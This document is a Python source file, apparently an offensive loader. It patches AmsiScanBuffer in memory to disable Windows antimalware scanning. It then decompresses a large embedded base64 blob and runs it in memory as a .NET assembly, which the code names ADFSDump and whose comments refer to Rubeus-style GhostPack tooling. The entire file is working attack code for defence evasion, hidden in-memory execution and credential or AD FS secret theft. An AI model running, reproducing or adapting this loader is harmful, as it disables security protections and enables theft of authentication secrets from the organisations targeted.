import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("ADFSDump.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()